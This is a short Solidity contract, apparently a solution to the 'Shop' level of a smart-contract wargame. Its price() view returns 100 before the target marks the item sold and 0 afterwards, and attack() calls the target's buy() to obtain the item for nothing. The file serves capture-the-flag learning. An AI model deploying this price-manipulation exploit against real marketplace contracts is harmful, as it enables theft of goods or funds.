// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Level21 {
    address addr;

    function price() external view returns (uint256) {
        (bool b, bytes memory d) = address(addr).staticcall(abi.encodeWithSignature("isSold()"));
        require(b);
        bool isSold = abi.decode(d, (bool));
        if (isSold) {
            return 0;
        } else {
            return 100;
        }
    }

    function attack(address _addr) public {
        addr = _addr;
        (bool b,) = address(addr).call(abi.encodeWithSignature("buy()"));
        require(b);
    }
}
